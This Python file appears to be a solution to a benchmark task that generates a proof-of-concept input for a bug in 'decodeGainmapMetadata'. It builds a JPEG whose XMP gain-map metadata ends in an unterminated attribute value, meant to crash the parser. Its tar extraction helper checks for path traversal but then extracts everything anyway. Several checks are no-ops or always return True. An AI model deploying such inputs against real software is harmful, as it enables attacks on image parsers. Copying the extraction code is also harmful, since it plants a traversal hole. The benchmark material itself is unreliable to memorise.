import os
import re
import tarfile
import tempfile
import shutil
from typing import Optional, Tuple, List


class Solution:
    def _safe_extract_tar(self, tar_path: str, out_dir: str) -> None:
        with tarfile.open(tar_path, "r:*") as tf:
            def is_within_directory(directory: str, target: str) -> bool:
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                return os.path.commonprefix([abs_directory, abs_target]) == abs_directory

            for member in tf.getmembers():
                member_path = os.path.join(out_dir, member.name)
                if not is_within_directory(out_dir, member_path):
                    continue
            tf.extractall(out_dir)

    def _prepare_src_tree(self, src_path: str) -> Tuple[str, Optional[str]]:
        if os.path.isdir(src_path):
            return src_path, None
        tmpdir = tempfile.mkdtemp(prefix="poc_src_")
        self._safe_extract_tar(src_path, tmpdir)
        return tmpdir, tmpdir

    def _iter_text_files(self, root: str):
        exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
            ".inc", ".inl", ".m", ".mm", ".java", ".kt", ".rs", ".go",
            ".py", ".txt", ".md"
        }
        for dirpath, dirnames, filenames in os.walk(root):
            dn = os.path.basename(dirpath).lower()
            if dn in {".git", ".svn", "third_party", "thirdparty", "vendor", "extern", "external"}:
                pass
            for fn in filenames:
                ext = os.path.splitext(fn)[1].lower()
                if ext not in exts and "fuzz" not in fn.lower():
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 3_000_000:
                    continue
                yield path

    def _read_text(self, path: str) -> Optional[str]:
        try:
            with open(path, "rb") as f:
                data = f.read()
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return None

    def _find_decode_function_file(self, root: str) -> Optional[Tuple[str, str]]:
        target = "decodeGainmapMetadata"
        for p in self._iter_text_files(root):
            txt = self._read_text(p)
            if not txt:
                continue
            if target in txt:
                return p, txt
        return None

    def _extract_relevant_strings(self, txt: str) -> Tuple[Optional[bytes], List[str], bool]:
        xmp_id = None
        keys: List[str] = []

        if "http://ns.adobe.com/xap/1.0/" in txt:
            xmp_id = b"http://ns.adobe.com/xap/1.0/\x00"

        str_lit_re = re.compile(r'"((?:\\.|[^"\\]){1,200})"')
        lits = str_lit_re.findall(txt)

        has_rdf = False
        for s in lits:
            s2 = s.encode("utf-8", "ignore").decode("utf-8", "ignore")
            if "rdf:Description" in s2 or "<rdf:" in s2:
                has_rdf = True
            if "hdrgm" in s2 or "GainMap" in s2 or "gainmap" in s2:
                if 2 <= len(s2) <= 120:
                    keys.append(s2)

        def unique_preserve(seq: List[str]) -> List[str]:
            seen = set()
            out = []
            for a in seq:
                if a in seen:
                    continue
                seen.add(a)
                out.append(a)
            return out

        keys = unique_preserve(keys)
        return xmp_id, keys, has_rdf

    def _detect_direct_fuzzer_call(self, root: str) -> bool:
        for p in self._iter_text_files(root):
            fnl = os.path.basename(p).lower()
            if "fuzz" not in fnl and "fuzzer" not in fnl:
                continue
            txt = self._read_text(p)
            if not txt:
                continue
            if "LLVMFuzzerTestOneInput" not in txt:
                continue
            if "decodeGainmapMetadata" in txt:
                return True
        return False

    def _detect_jpeg_like(self, root: str, decode_txt: Optional[str]) -> bool:
        if decode_txt:
            if "xap/1.0" in decode_txt or "APP1" in decode_txt or "JFIF" in decode_txt or "FFD8" in decode_txt:
                return True
        hints = 0
        for p in self._iter_text_files(root):
            fnl = os.path.basename(p).lower()
            if "fuzz" not in fnl and "fuzzer" not in fnl:
                continue
            txt = self._read_text(p)
            if not txt:
                continue
            if "LLVMFuzzerTestOneInput" not in txt:
                continue
            tl = txt.lower()
            if "jpeg" in tl or "jfif" in tl or "ffd8" in tl or "app1" in tl or "xap/1.0" in tl:
                hints += 1
            if "uhdr" in tl or "ultrahdr" in tl:
                hints += 2
            if hints >= 2:
                return True
        return True

    def _build_xmp_payload(self, keys: List[str], has_rdf: bool) -> bytes:
        def pick_contains(sub: str) -> Optional[str]:
            sub_l = sub.lower()
            for k in keys:
                if sub_l in k.lower():
                    return k
            return None

        ver = pick_contains("version") or "hdrgm:Version"
        gmin = pick_contains("gainmapmin") or "hdrgm:GainMapMin"
        gmax = pick_contains("gainmapmax") or "hdrgm:GainMapMax"
        gamma = pick_contains("gamma") or "hdrgm:Gamma"
        osdr = pick_contains("offsetsdr") or "hdrgm:OffsetSDR"
        ohdr = pick_contains("offsethdr") or "hdrgm:OffsetHDR"
        hcmin = pick_contains("hdrcapacitymin") or "hdrgm:HDRCapacityMin"
        hcmax = pick_contains("hdrcapacitymax") or "hdrgm:HDRCapacityMax"

        def normalize_key(k: str) -> str:
            k = k.strip()
            if len(k) == 0:
                return k
            if k.endswith('\\"'):
                k = k[:-2] + '"'
            if k.endswith("\\"):
                k = k[:-1]
            if k.endswith('"'):
                k = k[:-1]
            return k

        ver = normalize_key(ver)
        gmin = normalize_key(gmin)
        gmax = normalize_key(gmax)
        gamma = normalize_key(gamma)
        osdr = normalize_key(osdr)
        ohdr = normalize_key(ohdr)
        hcmin = normalize_key(hcmin)
        hcmax = normalize_key(hcmax)

        props = (
            f'{ver}="1.0" '
            f'{gmin}="0" '
            f'{gamma}="1" '
            f'{osdr}="0" '
            f'{ohdr}="0" '
            f'{hcmin}="0" '
            f'{hcmax}="1" '
            f'{gmax}="'
        ).encode("utf-8", "ignore")

        if has_rdf:
            return b"<rdf:Description " + props + b"/>"
        return props

    def _build_jpeg(self, payload: bytes) -> bytes:
        soi = b"\xFF\xD8"
        app0_payload = b"JFIF\x00\x01\x02\x00\x00\x01\x00\x01\x00\x00"
        app0 = b"\xFF\xE0" + (len(app0_payload) + 2).to_bytes(2, "big") + app0_payload

        app1 = b"\xFF\xE1" + (len(payload) + 2).to_bytes(2, "big") + payload
        eoi = b"\xFF\xD9"
        return soi + app0 + app1 + eoi

    def solve(self, src_path: str) -> bytes:
        root, tmpdir = self._prepare_src_tree(src_path)
        try:
            decode_info = self._find_decode_function_file(root)
            decode_txt = decode_info[1] if decode_info else None

            xmp_id = None
            keys: List[str] = []
            has_rdf = False
            if decode_txt:
                xmp_id, keys, has_rdf = self._extract_relevant_strings(decode_txt)

            if xmp_id is None:
                xmp_id = b"http://ns.adobe.com/xap/1.0/\x00"

            direct = self._detect_direct_fuzzer_call(root)
            jpeg_like = self._detect_jpeg_like(root, decode_txt)

            xmp = self._build_xmp_payload(keys, has_rdf)
            payload = xmp_id + xmp

            if direct and not jpeg_like:
                return payload

            return self._build_jpeg(payload)
        finally:
            if tmpdir:
                shutil.rmtree(tmpdir, ignore_errors=True)